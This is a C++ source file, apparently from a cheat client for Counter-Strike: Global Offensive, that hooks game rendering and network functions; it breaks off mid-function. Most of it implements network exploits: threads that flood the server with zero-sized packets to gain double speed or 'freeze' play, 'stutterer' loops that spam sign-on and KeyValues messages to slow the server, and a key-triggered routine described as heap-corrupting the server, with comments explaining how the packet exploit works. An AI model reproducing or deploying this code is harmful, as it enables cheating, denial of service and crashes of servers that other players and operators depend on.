#include <ctype.h>

#include "Hooks.h"
#include "ClientHooks.h"
#include "Hooks/Antaeus/Hooks/UserMode/MinHook.h"

#include "Interfaces.h"
#include "Memory.h"

#include "Hacks/Backtrack.h"
#include "Hacks/Glow.h"
#include "Hacks/Visuals.h"

#include "SDK/OsirisSDK/Engine.h"
#include "SDK/OsirisSDK/UserCmd.h"
#include "SDK/OsirisSDK/GlobalVars.h"
#include "SDK/OsirisSDK/LocalPlayer.h"
#include "SDK/OsirisSDK/Entity.h"
#include "GameData.h"
#include "COMPILERDEFINITIONS.h"

#include "SDK/SDK/CViewSetup.h"
#include "SDK/SDKAddition/EntityListCull.hpp"

int __stdcall ClientModeHooks::doPostScreenEffects(int param) noexcept
{
    //entitylistculled.cullEntities(); /* Initial Setup */

    if (interfaces->engine->isInGame()) {
        Glow::render();
        //Visuals::reduceFlashEffect();
        //Visuals::updateBrightness();
        //Visuals::remove3dSky();
        Visuals::thirdperson();
    }
    return hooks->clientMode.callOriginal<int, 44>(param);
}
#include "Timing.h"
#include "Hacks/ESP.h"
void __stdcall ClientModeHooks::overrideView(CViewSetup* setup) noexcept
{

    bool bCallTP{ true };
    if (localPlayer && localPlayer.get() && !localPlayer->isDormant() && !localPlayer->isAlive()) {
        Entity* spec = localPlayer->getObserverTarget();
        if (spec) {
            if (Timing::ExploitTiming.m_bNetworkedFreeze) {
                PlayerInfo PlayerInf;
                interfaces->engine->getPlayerInfo(spec->index(), PlayerInf);
                if (PlayerInf.friendsId == ESP::g_Denzil.m_nSteamID) {
                    bCallTP = false;
                    interfaces->engine->setViewAngles(ESP::g_Denzil.m_vEyeAngles);
                    setup->origin = ESP::g_Denzil.m_vEyePosition;
                    setup->angles = ESP::g_Denzil.m_vEyeAngles;
                }
                else {
                    Debug::QuickPrint("Not Speccing Harpoon User");
                }

            }

        }
    }

    if(bCallTP)
        Visuals::thirdperson(setup, true);


    hooks->clientMode.callOriginal<void, 18>(setup);
}


#include "Hacks/TickBaseManager.h"
#include "Hacks/OTHER/Debug.h"
bool wentBack = false;
bool Lag = false;

#if 0
/*
static int __fastcall SendDatagram(NetworkChannel* network, void* edx, void* datagram)
{
    auto original = hooks->networkChannel.getOriginal<int, void*>(46, datagram);
    network->SetMaxRoutablePayloadSize(10);
    if (!config->backtrack.fakeLatency || datagram || !interfaces->engine->isInGame() || !config->backtrack.enabled)
    {
        if (!wentBack) {
            //Debug::QuickPrint("Incrementing OutSeq in SendDatagram", false);
            //network->OutSequenceNr -= 1;
            wentBack = true;
        }
        else  {
            wentBack = false;
            //network->OutSequenceNr += 1;
        }

        return original(network, datagram);
    }



    int instate = network->InReliableState;
    int insequencenr = network->InSequenceNr;
    int faketimeLimit = config->backtrack.timeLimit; if (faketimeLimit <= 200) { faketimeLimit = 0; }
    else { faketimeLimit -= 200; }

    faketimeLimit = 999999;

    float delta = max(0.f, std::clamp(faketimeLimit / 1000.f, 0.f, Backtrack::cvars.maxUnlag->getFloat()) - network->getLatency(0));




    Backtrack::AddLatencyToNetwork(network, delta);

    int result = original(network, datagram);
    for (int i = 0; i < 2000; i++) {
            Backtrack::AddLatencyToNetwork(network, delta);
            network->InSequenceNr++;
            network->OutSequenceNrAck++;

        original(network, datagram);
    }


    network->InReliableState = instate;
    network->InSequenceNr = insequencenr;

    return result;
}

*/
#endif
#include "Hacks/SendNetMSG/SendNetMsg.h"

#ifndef _DEBUG
#pragma comment(lib,"C:\\Users\\user\\source\\repos\\Harpoon\\Harpoon\\Resource\\Protobuf\\libprotobuf.lib")
#endif
#ifdef _DEBUG
#pragma comment(lib,"C:\\vcpkg\\installed\\x86-windows-static-md\\debug\\lib\\libprotobufd.lib")
#endif
//#pragma comment(lib,"../../Resource/Protobuf/libprotobuf.lib")


#include "Resource/Protobuf/Headers/cstrike15_gcmessages.pb.h"
#include "Resource/Protobuf/Headers/netmessages.pb.h"
#include "Hacks/OTHER/Debug.h"
#include "Hacks/TickbaseManager.h"
#include "Other/MessageSender.h"
//#include <Windows.h>
#include "SDK/OsirisSDK/NetworkChannel.h"


bool WriteToBuffer(bf_write& buffer, CNETMsg_NOP nop) {
    int size = nop.ByteSize();
    if ((buffer.GetNumBitsWritten() % 8) == 0)
    {

        int sizeWithHeader = size + 1 + buffer.ByteSizeVarInt32(net_NOP) + buffer.ByteSizeVarInt32(size);

        if (buffer.GetNumBytesLeft() >= sizeWithHeader)
        {
            buffer.WriteVarInt32(net_NOP);
            buffer.WriteVarInt32(size);

            if (!nop.SerializeWithCachedSizesToArray((google::protobuf::uint8*)buffer.GetData() + buffer.GetNumBytesWritten()))
            {
                return false;
            }

            // Tell the buffer we just splatted into it
            buffer.SeekToBit(buffer.GetNumBitsWritten() + (size * 8));
            return true;
        }

        // Won't fit
        return false;
    }

    // otherwise we have to do a temp allocation so we can write it all shifted
#ifdef NET_SHOW_UNALIGNED_MSGS
    DevMsg("Warning: unaligned write of protobuf message %s (%d bytes)\n", PB_OBJECT_TYPE::GetTypeName().c_str(), size);
#endif

    void* serializeBuffer = alloca(size);

    if (!nop.SerializeWithCachedSizesToArray((google::protobuf::uint8*)serializeBuffer))
    {
        return false;
    }

    buffer.WriteVarInt32(net_NOP);
    buffer.WriteVarInt32(size);
    return buffer.WriteBytes(serializeBuffer, size);
}


#ifdef DEV_SECRET_BUILD
#ifdef DUMBEST_LAGGER
void SendZeroSizedPacket(volatile NetworkChannel* network) {
    static char packet[5];
    static int ASMSIZE{ 0 };
    static void* callSentToPtr{ (void*)memory->Calls_SendToImpl };
    static int ret;
    __asm {
        mov     eax, ASMSIZE
        push    0FFFFFFFFh
        push    eax
        lea     edx, packet
        mov		ecx, network
        call callSentToPtr
        add esp, 8
        mov ret, eax
    }
}


/*
Obviously CSteamSocketMgr was written with WinSocks::recvfrom/<socket.h> recvfrom in mind, and not the implementation they use for steam game sockets. 

SteamNetworkingSockets just pushes 0 sized packets through and out (There's even a comment saying they should handle it!).
This means you can make the server think there's no data on the port and just wait. The wait time is roughly 1 tick (at 64tick).
So if you send 2 0 sized packets per tick (call NetSendTo with a data size of 0), the game will start buffering all commands sent 
to the server. Eventually you'll start executing dummy commands on the server. So you are able to just run your client 2x speed
(make sure you don't start sending packets at 2x speed), or even better, just call run command twice. You can scale everything by
the ammount of packets you send (therefore changing the speed).


Let the record show that shark wasn't cool giving this out as it was originally FLAW's exploit (mad respect to him for keeping that trust and not giving it out)
and I ended up rediscovering it during a call with shark when I saw the comment in GameNetworkingSockets Repo saying they don't handle 0 sized packets, just push it
through. Crazy coincidence. The first time I speak to shark, I find the exploit I had spent MONTHS searching for. Life sure is crazy ain't it??

*/



void ClientHooks::SendZeroSizedPacket(volatile NetworkChannel* network) {
    static char packet[5];
    static int ASMSIZE{ 0 };
    static void* callSentToPtr{ (void*)memory->Calls_SendToImpl };
    static int ret;
    __asm {
        mov     eax, ASMSIZE
        push    0FFFFFFFFh
        push    eax
        lea     edx, packet
        mov		ecx, network
        call callSentToPtr
        add esp, 8
        mov ret, eax
    }
}


static void SendOneSizedPacket(volatile NetworkChannel* network) { 
    char packet[13];
    int ASMSIZE = 13;
    void* callSentToPtr = (void*)memory->Calls_SendToImpl;
    int ret;
    __asm {
        mov     eax, ASMSIZE
        push    0FFFFFFFFh
        push    eax
        lea     edx, packet
        mov		ecx, network
        call callSentToPtr
        add esp, 8
        mov ret, eax
    }
}
#endif
#endif
#include "Timing.h"
#include "EngineHooks.h"
#include "SDK/SDK/CNetMessageBinder.h"
volatile NetworkChannel* g_OurNetChann = NULL;
static bool g_bHasSentCmd = false;
std::mutex g_mSentCmdMutex;


//#define BLIPPER_TEST_NET_TICK_CREATE
#include "Other/CrossCheatTalk.h"
static bool g_InRise = false;
static bool g_InFall = false;

extern void send_data_msg(VoiceDataCustom* data);
unsigned int __stdcall PauseServerReceiveThread(void*)
{
#ifdef DEV_SECRET_BUILD
#ifdef DUMBEST_LAGGER
    Debug::QuickWarning("Pause!");
    static int lastTickCalled{ 0 };
    static float floatLastLatency{ 9999.f };
    static float frameTime = memory->globalVars->frametime;
    static bool wasOn{ false };
    static int skipAmount{ 2 };
    static int packetCount{ 4 };
    static float lastCallTime{ 0 };

    static bool InLag{ 0 };
    static float nextCallTime{ 0 };


    static int PacketsLastSent{ 0 };
    static float PacketLatency{ -1.f };
    //static float NormalLatency{ 0.f };
    static float engaged{ 0.f };
    static bool bShouldLag{ false };
    static int packets = 2;//(static_cast<int>(config->mmlagger.desiredPing / 20.f)) / 2;
    static float lastSetTime{ 0.f };

    static float sketchPredFixHelper{ 0.f };
    g_NormalLatency = interfaces->engine->getNetworkChannel()->getLatency(FLOW_OUTGOING) * 1000;
    while (true) {

        if (!Timing::newFrame) {
            continue;
        }

        if (!g_OurNetChann || !interfaces->engine->getNetworkChannel() || (interfaces->engine->getNetworkChannel() != g_OurNetChann) || !interfaces->engine->isConnected()) {
            continue;
        }

        if (!g_bHasSentCmd) {
            continue;
        }


        Timing::newFrameMutex.lock();
        Timing::newFrame = false;
        Timing::newFrameMutex.unlock();


        if (GetAsyncKeyState(config->mmlagger.KeepAlive)) {
            //SendOneSizedPacket(g_OurNetChann);
            continue;
        }

        float latency = interfaces->engine->getNetworkChannel()->getLatency(FLOW_OUTGOING) * 1000.f;
        bool wasUp{ true };

#if 1
        if (config->mmlagger.shouldLag) {
            int packet = wasOn ? 2 : 2 * 4;
            if (latency < (config->mmlagger.desiredPing - 400.f) && wasOn) {
                packet = 3;
            }
            wasOn = true;
            for (int i = 0; i < packet; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            wasOn = true;
            g_mSentCmdMutex.lock();
            g_bHasSentCmd = false;
            g_mSentCmdMutex.unlock();
            Sleep((memory->globalVars->intervalPerTick * 1000));
            //Sleep((30.f/1850.f) *config->mmlagger.desiredPing);
            Sleep(30.f);
            if (latency > (config->mmlagger.desiredPing + 50.f)) {
                Sleep(2.0f);
            }
            continue;
        }
        else {
            wasOn = false;
        }
#endif

        if (config->mmlagger.stutter) {
            Sleep(3.f * 1000.f);
            for (int i = 0; i < 30; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep(1.f * 1000.f);
            for (int i = 0; i < 50; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep(2.f * 1000.f);
            for (int i = 0; i < 90; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep(4.f * 1000.f);
            for (int i = 0; i < 3; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
        }

        if (config->mmlagger.stutter2) {
            Sleep(3.f * 1000.f);
            for (int i = 0; i < 90; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep(1.f * 1000.f);
            for (int i = 0; i < 90; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep(2.f * 1000.f);
            for (int i = 0; i < 90; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep(4.f * 1000.f);
            for (int i = 0; i < 2; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
        }


        if (config->mmlagger.crimWalk) {
            Timing::ExploitTiming.m_bForceDoubleSpeed = false;
            for (int i = 0; i < 120; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep(4.f * 1000.f);
            Timing::ExploitTiming.m_bForceDoubleSpeed = true;
        }

#if 1
        if (!config->mmlagger.bNewPrediction) {
            static int nPrevDelta{ 0 };
            if (GetAsyncKeyState(config->TestShit.fuckKey9)) {
                if (wasOn) {
                    if ((sketchPredFixHelper - memory->globalVars->realtime) > 4.f) {
                        sketchPredFixHelper = memory->globalVars->realtime;
                        //Sleep((memory->globalVars->intervalPerTick * 1000)); //+ NormalLatency); 
                        //continue;
                    }
                }
                if (config->mmlagger.bNewPrediction && Timing::TimingSet_s.m_bInPredictionMode) {
                    Timing::ExploitTiming.m_bStopAllDatagramsIn = true;
                    nPrevDelta = memory->clientState->deltaTick;
                }
                int packet = wasOn ? config->mmlagger.packets : config->mmlagger.packets + 1;

                for (int i = 0; i < packet; i++) {
                    SendZeroSizedPacket(g_OurNetChann);
                }
                if (!wasOn) {

                    if (interfaces->engine->getNetworkChannel()) {
                        Debug::QuickWarning("Get Fucked");
                        VoiceFreeze_t packet;
                        strcpy(packet.GetFucked, "GetFucked"); // Yeah Really Tho
                        packet.FreezeTickCount = memory->globalVars->tickCount;
                        packet.FreezePackets = config->mmlagger.ticksToSimulate;
                        packet.FreezeTimeLeft = -1.0f;
                        VoiceDataCustom data;
                        memcpy(data.get_raw_data(), &packet, sizeof(packet));
                        send_data_msg(&data);
                    }


                    sketchPredFixHelper = memory->globalVars->realtime;
                    g_NormalLatency = interfaces->engine->getNetworkChannel()->getLatency(FLOW_OUTGOING) * 1000;
                }
                wasOn = true;
                g_mSentCmdMutex.lock();
                g_bHasSentCmd = false;
                g_mSentCmdMutex.unlock();
                Sleep((1.f / 768.f));
                //Sleep((memory->globalVars->intervalPerTick * 1000) + g_NormalLatency); //+ NormalLatency); 
                continue;
            }
            else if (wasOn) {

                if (interfaces->engine->getNetworkChannel()) {
                    Debug::QuickWarning("Get Fucked");
                    VoiceFreeze_t packet;
                    strcpy(packet.GetFucked, "GetFucked"); // Yeah Really Tho
                    packet.FreezeTickCount = memory->globalVars->tickCount;
                    packet.FreezePackets = config->mmlagger.ticksToSimulate;
                    packet.FreezeTimeLeft = 1.0f;
                    VoiceDataCustom data;
                    memcpy(data.get_raw_data(), &packet, sizeof(packet));
                    send_data_msg(&data);
                }

                if (config->mmlagger.bNewPrediction) {
                    Timing::ExploitTiming.m_bStopAllDatagramsIn = false;
                    memory->clientState->deltaTick = nPrevDelta;
                }
                //memory->globalVars->tickCount = memory->clientState->serverCount;
                Timing::TimingSet_s.m_bInPredictionMode = false;
                if(!Timing::ExploitTiming.m_bNetworkedFreeze)
                    memory->clientState->deltaTick = -1;
            }
            else {
                if (config->mmlagger.bNewPrediction)
                    Timing::TimingSet_s.m_bInPredictionMode = false;
            }

            if (config->mmlagger.bNewPrediction && !Timing::TimingSet_s.m_bInPredictionMode)
                Timing::ExploitTiming.m_bStopAllDatagramsIn = false;


        }

#endif

        static bool Blipper{ false };
        if (GetAsyncKeyState(config->mmlagger.blip)) {
            static int timesSent{ 0 };
            static int deltaTickLastSent{ 0 };
            static int deltaTickOut{ 0 };
            deltaTickOut = memory->clientState->deltaTick;

            if (!Blipper) {
                Timing::ExploitTiming.m_bDoneSendingBlip = false;
                Timing::ExploitTiming.m_bDontSendNetTick = true;
                Debug::QuickPrint("SENDING PING PACKET BLIP!");
                for (int i = 1; i < config->mmlagger.blippackets ; i++) {
                    if ((memory->clientState->deltaTick > deltaTickOut) && (memory->clientState->deltaTick != -1)) {
                        deltaTickOut = (uint32_t)memory->clientState->deltaTick;
                    }
#ifdef BLIPPER_TEST_NET_TICK_CREATE
                    if (!(i % 2)) {
                        static char NetTickBuffer[NET_MAX_MESSAGE];
                        static bf_write msg(NetTickBuffer, NET_MAX_MESSAGE);
                        static CNETMsg_Tick tick;
                        tick.set_tick(memory->clientState->deltaTick);
                        bool fullUp = false;
                                 tick.set_tick(deltaTickOut);
                                            
                        if (tick.tick() > Timing::ExploitTiming.m_nMaxNetTickSent) {
                            Timing::ExploitTiming.m_nMaxNetTickSent = tick.tick();
                            nHighestDeltaTick = tick.tick();
                        }

                        tick.set_host_computationtime(1.f);
                        tick.set_host_computationtime_std_deviation(1.f);
                        tick.set_host_framestarttime_std_deviation(1.f);
                        g_ProtoWriter.WriteNetTick(&tick, &msg);

                        Debug::QuickPrint("Sending Delta BLIP Tick");
                        Debug::QuickPrint(std::to_string(tick.tick()).c_str());

                        deltaTickOut++;
                        //memory->globalVars->tickCount++;
                        SendOurMessage((NetworkChannel*)g_OurNetChann, msg.GetData(), msg.GetNumBytesWritten(), false, false, false, false);
                        if (!fullUp) {
                            deltaTickLastSent = tick.tick();
                        } 
                        g_OurNetChann->OutSequenceNr++;
                        g_OurNetChann->InSequenceNr++;
                    }
#endif
                    SendZeroSizedPacket(g_OurNetChann);
                   // SendZeroSizedPacket(g_OurNetChann);
                }
                Timing::ExploitTiming.m_bDidBlip = true;
                Timing::ExploitTiming.m_nTicksLeftToDrop += config->mmlagger.blippackets;

                Timing::ExploitTiming.m_bDoneSendingBlip = true;
                EngineHooks::SentBlipLagPacket = true;
            }
            timesSent = 0;
            deltaTickLastSent = 0;
            Blipper = true;
        }
        else {
            Blipper = false;

        }




        if ((memory->globalVars->currenttime - Timing::TimingInfo_s.m_fLastNetTickUpdate) > (config->mmlagger.desiredPing - g_NormalLatency)) {
            engaged = true;
            wasOn = false;
            bShouldLag = false;
            continue;
        }
    }
    //Debug::QuickWarning("EXITING THREAD!");
#endif
#endif
}

#ifdef DEV_SECRET_BUILD
unsigned int __stdcall KeepAliveThread(void*)
{
    while (true) {
        if (GetAsyncKeyState(config->mmlagger.KeepAlive)) {
            SendOneSizedPacket(g_OurNetChann);
        }
        if (config->mmlagger.KeepAliveSleep) {
            Sleep(.0001);
        }

        if (config->mmlagger.turnoffDesync) {
            for (int i = 0; i < config->mmlagger.desyncTimer; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            Sleep((memory->globalVars->intervalPerTick*1000.f) * (float)config->mmlagger.tickOut);
        }



    }
}
#endif


// Literally Spam SignonState_Changelevel and slow down the server
unsigned int __stdcall ServerStutterer2(void*)
{
    char* pSignOnBuffer{ NULL };
    static int pBufferSize{ NULL };
    bf_write* pMsg{ NULL };
    int nCount{ 0 };
    while (true) {
        if (GetAsyncKeyState(config->stutterer.key) || config->stutterer.enabled) {
            if (!pSignOnBuffer) {
                CNETMsg_SignonState Signon;
                Signon.set_signon_state(SIGNONSTATE_CHANGELEVEL);
                Signon.set_spawn_count(20);
                pBufferSize =( NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD*50));
                pSignOnBuffer = (char*)malloc(pBufferSize);
                static bf_write buffStat(pSignOnBuffer, pBufferSize);
                pMsg = &buffStat;
                for (int i = 0; i < 2; i++) {
                    g_ProtoWriter.WriteSignonState(&Signon, &buffStat); /* CNetMessageBinder<>*/
                }
            }
            /* Send Datagram But Thread Safe */
            SendOurMessage((NetworkChannel*)g_OurNetChann, pMsg->GetData(), pMsg->GetNumBytesWritten(), false, true, false, false);
            if (nCount > 200) {
                Sleep(2000);
            }
        }
    }
}  /* Enron 4/6/2020 */





static bool WriteUserCmdDeltaInt(bf_write* buf, char* what, int from, int to, int bits = 32)
{
    if (from != to) {
        buf->WriteOneBit(1);
        buf->WriteUBitLong(to, bits);
        return true;
    }

    buf->WriteOneBit(0);
    return false;
}



void WriteNullUsercmd(bf_write* buf, int command_number, int tick_count)
{
    buf->WriteOneBit(1);
    buf->WriteUBitLong(command_number, 32);
    buf->WriteOneBit(1);
    buf->WriteUBitLong(tick_count, 32);
    buf->WriteOneBit(0);//viewangles
    buf->WriteOneBit(0);
    buf->WriteOneBit(0);
    buf->WriteOneBit(0);//aimdir
    buf->WriteOneBit(0);
    buf->WriteOneBit(0);
    buf->WriteOneBit(200);//forward
    buf->WriteOneBit(0);//side
    buf->WriteOneBit(0);//up
    buf->WriteOneBit(0);//buttons
    buf->WriteOneBit(0);//impulse
    buf->WriteOneBit(0);//weaponselect
    buf->WriteOneBit(0);//mousedx
    buf->WriteOneBit(0);//mousedy
}
#include "SDK/OsirisSDK/KeyValues.h"
unsigned int __stdcall ServerStutterer3(void*)
{
    char* signOnBuffer{ NULL };
    static int bufferSize{ NULL };
    bf_write* msg{ NULL };
    int count{ 0 };
    //static char data[4096];
    std::string data;
    data.resize(4096);
    while (true) {
        if (GetAsyncKeyState(config->stutterer.key) || config->stutterer.enabled) {
                bf_write usercmd(data.data(), 4096);
                if (!signOnBuffer) {
                    signOnBuffer = (char*)malloc(bufferSize);
                    //WriteNullUsercmd(&usercmd, g_OurNetChann->OutSequenceNr, memory->globalVars->tickCount - (config->stutterer.CountToSend - count));
                    CCLCMsg_CmdKeyValues Signon;
                    //KeyValues* NewKeyValue = KeyValues::fromString("OnPlayerAward", "Testing KeyValues");
                    Signon.set_keyvalues("OnPlayerAward", strlen("OnPlayerAward"));
                    bufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
                    static bf_write buffStat(signOnBuffer, bufferSize);
                    msg = &buffStat;
                    for (int i = 0; i < 2; i++) {
                        g_ProtoWriter.WriteCLCKeyValues(&Signon, &buffStat);
                    }
                }
               // Debug::QuickPrint(("Server Stutterer 3 Data Size = " + std::to_string(msg->GetNumBytesWritten())).c_str());
                //int prevOutSeq = g_OurNetChann->OutSequenceNr;
                //g_OurNetChann->OutSequenceNr += 150;
                SendOurMessage((NetworkChannel*)g_OurNetChann, msg->GetData(), msg->GetNumBytesWritten(), false, true, false, false, false, 0);
                //count++;
                if (count >= config->stutterer.CountToSend) {
                    Sleep(config->stutterer.SleepTime);
                    count = 0;
                }
        }
    }

}

// This sometimes works?
unsigned int __stdcall TestLagger(void*)
{
    char* splitScreenBuffer{ NULL };
    static int bufferSize{ NULL };
    bf_write* msg{ NULL };
    int count{ 0 };
    static bool hasSent{ false };
    while (true) {   
        if (GetAsyncKeyState(config->stutterer.key) || config->stutterer.enabled) {
            if (!hasSent) {
                if (!splitScreenBuffer) {
                    CCLCMsg_HltvReplay Hltv;
                    Hltv.set_request(REPLAY_EVENT_STUCK_NEED_FULL_UPDATE);
                    bufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
                    splitScreenBuffer = (char*)malloc(bufferSize);
                    static bf_write buffStat(splitScreenBuffer, bufferSize);
                    msg = &buffStat;
                    for (int i = 0; i < 2; i++) {
                        g_ProtoWriter.WriteHLTVReplay(&Hltv, &buffStat);
                    }
                }
                SendOurMessage((NetworkChannel*)g_OurNetChann, msg->GetData(), msg->GetNumBytesWritten(), false, true, false, false);
                count++;
                if (count >= config->stutterer.CountToSend) {
                    //Debug::QuickPrint("Test Lagger Sleeping");
                    Sleep(config->stutterer.SleepTime);
                    count = 0;
                }       
            }
        }
        else {
        }
    }

}


unsigned int __stdcall DeathMatchImmunity(void*) { /* Thanks ITAS! */
    while (true) {
        if (config->debug.DeathMatchInvincibility && localPlayer.get() &&( localPlayer->lifeState() == LIFE_ALIVE) && localPlayer->gunGameImmunity()) {
            CNETMsg_StringCmd StringCmd;
            StringCmd.set_command("open_buymenu");
        }
    }
}


unsigned int __stdcall CrashServer(void*) { 
    // NAH LMAO
}



#include "EngineHooks.h"
#include "Timing.h"

static int lastTickCalled{ 0 };

//extern void WriteUsercmd(bf_write*, UserCmd*, UserCmd*);
__forceinline void _WriteUsercmd(void* buf, UserCmd* in, UserCmd* out)
{
    static DWORD WriteUsercmdF = (DWORD)memory->WriteUsercmd;

    __asm
    {
        mov ecx, buf
        mov edx, in
        push out
        call WriteUsercmdF
        add esp, 4
    }
}

static int __fastcall SendDatagram(NetworkChannel* network, void* edx, bf_write* datagram)
{

    if (!network)
        return 0;



    if (GetAsyncKeyState(config->sharkcrasher.key))
    {
        //heap corrupt the server
        corrupt_server = true;
        EngineHooks::SendCrasherData();
        corrupt_server = false;
        return network->OutSequenceNr - 1;
    }



    if (false && (GetAsyncKeyState(VK_NUMLOCK) || GetAsyncKeyState(VK_LBUTTON))) {

        static int bufferSize{ NULL };
        static bf_write* msg{ NULL };
        static bf_write* cmdData{ NULL };
        static const char* buffer{ 0 };
        if (!buffer)
        {
            CCLCMsg_Move clcMoveMsg;
            if (!buffer)
            {
                int bufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
                buffer = (char*)malloc(bufferSize);
                static char* cmdBuffer = (char*)malloc(bufferSize);
                static bf_write cmdBf(cmdBuffer, bufferSize);
                static bf_write buffStat((char*)buffer, bufferSize);
                msg = &buffStat;
                cmdData = &cmdBf;
            }
            else {
                memset((void*)buffer, 0, bufferSize);
                msg->SeekToBit(0);
            }
            UserCmd randoCmd;
            Timing::ExploitTiming.m_LastCmd.tickCount = memory->globalVars->tickCount;

            for (int i = 0; i < 100; i++) {
                Timing::ExploitTiming.m_LastCmd.tickCount += INT_MAX;
                Timing::ExploitTiming.m_LastCmd.commandNumber += INT_MAX;
                _WriteUsercmd(cmdData, &Timing::ExploitTiming.m_LastCmd, &randoCmd);
                clcMoveMsg.set_data(cmdData->GetData(), cmdData->GetNumBytesWritten());
                clcMoveMsg.set_num_new_commands(1);
                clcMoveMsg.set_num_backup_commands(0);
                for (int i = 0; i < 2; i++)
                {
                    g_ProtoWriter.WriteCLCMove(&clcMoveMsg, msg);
                }
                randoCmd = Timing::ExploitTiming.m_LastCmd;
                SendOurMessage(network, msg->GetData(), msg->GetNumBytesWritten(), false, false, false, false, false, INT_MAX);
                msg->SeekToBit(0);
                memset((void*)buffer, 0, bufferSize);
                cmdData->SeekToBit(0);
                memset((void*)cmdData->GetData(), 0, bufferSize);
                network->OutSequenceNr += 3000;
            }
        }
      
        network->OutSequenceNr += 3000;

    }

    char* signOnBuffer{ NULL };
    static int bufferSize{ NULL };
    bf_write* msg{ NULL };
    int count{ 0 };
    if (config->debug.instareconnect) {
        config->debug.instareconnect = false;
        if (!signOnBuffer) {
            CNETMsg_SignonState Signon;
            Signon.set_signon_state(SIGNONSTATE_NEW);
            Signon.set_spawn_count(20);
            bufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
            signOnBuffer = (char*)malloc(bufferSize);
            static bf_write buffStat(signOnBuffer, bufferSize);
            msg = &buffStat;
            for (int i = 0; i < 2; i++) {
                g_ProtoWriter.WriteSignonState(&Signon, &buffStat);
            }   
        }
        Debug::QuickPrint("Sending Insta-Reconnect!");
        SendOurMessage((NetworkChannel*)g_OurNetChann, msg->GetData(), msg->GetNumBytesWritten(), false, true, false, false);
    }


    float Time = memory->globalVars->realtime;
    NetworkingMutex.lock();
    if ((Time - memory->globalVars->realtime) > 1.f) {
        Debug::QuickPrint(("SendDatagram Waited " + std::to_string(Time) + "s For a lock!").c_str());
    }




#if 1
#if 0
    if (config->mmlagger.shouldLag) {
        float freezeforsecs = config->mmlagger.desiredPing;
        float unfreezeforsecs = memory->globalVars->intervalPerTick;

        static int nLastTickCount{ 0 };;
        static float fNextElapseTime{ 0.f };
        static bool bFlipFlop{ false };
        if (true) {
            if (memory->globalVars->realtime > fNextElapseTime) {
                bFlipFlop = !bFlipFlop;
                if (!bFlipFlop) {
                    fNextElapseTime = memory->globalVars->realtime + unfreezeforsecs;
                }
                else {
                    fNextElapseTime = memory->globalVars->realtime + freezeforsecs;
                }
            }
            if (bFlipFlop) {
                if (memory->globalVars->tickCount > (nLastTickCount+1)) {
                    SendZeroSizedPacket(network);
                    SendZeroSizedPacket(network);
                    SendZeroSizedPacket(network);

                }
            } else {
                if (memory->globalVars->tickCount > (nLastTickCount)) {
                    SendZeroSizedPacket(network);
                    SendZeroSizedPacket(network);
                    SendZeroSizedPacket(network);
                    SendZeroSizedPacket(network);
                }
            }
            nLastTickCount = memory->globalVars->tickCount;

        }
    }
#endif

#if 0
    static float lastSendTime{ 0.f };
    static bool bWasOn{ 0 };
    if (config->mmlagger.turnoffDesync) {
        if (!(memory->globalVars->tickCount % config->mmlagger.desyncTimer)) {
            static int nLastTick{ 0 };
            if (nLastTick < memory->globalVars->tickCount) {
                nLastTick = memory->globalVars->tickCount;
                for (int i = 0; i < (config->mmlagger.desyncTimer - 1); i++) {
                    SendZeroSizedPacket(network);
                }
            }
        }
     }
#endif


    static bool wasOn{ false };
   // static int lastTick{ 0 };
    if (config->mmlagger.bNewPrediction && (memory->globalVars->tickCount > (Timing::ExploitTiming.m_nActivateTick+2))) {
        static int nPrevDelta{ 0 };
        if (GetAsyncKeyState(config->TestShit.fuckKey9)) {
            if (wasOn) {

            }
            if (config->mmlagger.bNewPrediction && Timing::TimingSet_s.m_bInPredictionMode) {
                Timing::ExploitTiming.m_bStopAllDatagramsIn = true;
                nPrevDelta = memory->clientState->deltaTick;
            }
            int packet = wasOn ? config->mmlagger.packets : config->mmlagger.packets + 1;

            for (int i = 0; i < packet; i++) {
                SendZeroSizedPacket(g_OurNetChann);
            }
            if (!wasOn) {


               // for (EntityQuick entq : entitylistculled->getEntities()) {
               //    entq.entity->flags() |= DISSOLVING;
               // }



                if (interfaces->engine->getNetworkChannel()) {
                    Debug::QuickWarning("Get Fucked");
                    VoiceFreeze_t packet;
                    strcpy(packet.GetFucked, "GetFucked"); // Yeah Really Tho
                    packet.FreezeTickCount = memory->globalVars->tickCount;
                    packet.FreezePackets = config->mmlagger.ticksToSimulate;
                    packet.FreezeTimeLeft = -1.0f;
                    VoiceDataCustom data;
                    memcpy(data.get_raw_data(), &packet, sizeof(packet));
                    send_data_msg(&data);
                }

                Timing::ExploitTiming.nExtraTicksToSimulate = config->mmlagger.ticksToSimulate;
                ExploitOnMsg OnMsg;
                OnMsg.set_on(true);
                OnMsg.set_speed(config->mmlagger.packets);
                OnMsg.set_tickstarted(memory->clientState->serverCount);
                CrossCheatTalk::g_pSteamNetSocketsNetChannel->BroadCastMessage(CrossCheatMsgType::k_ExploitOnMsg, &OnMsg, 58);

                //sketchPredFixHelper = memory->globalVars->realtime;
                g_NormalLatency = interfaces->engine->getNetworkChannel()->getLatency(FLOW_OUTGOING) * 1000;
            }
            wasOn = true;
            //Sleep((memory->globalVars->intervalPerTick * 1000) + g_NormalLatency); //+ NormalLatency); 
           // continue;
        }
        else if (wasOn) {
            if (interfaces->engine->getNetworkChannel()) {
                Debug::QuickWarning("Get Fucked");
                VoiceFreeze_t packet;
                strcpy(packet.GetFucked, "GetFucked"); // Yeah Really Tho
                packet.FreezeTickCount = memory->globalVars->tickCount;
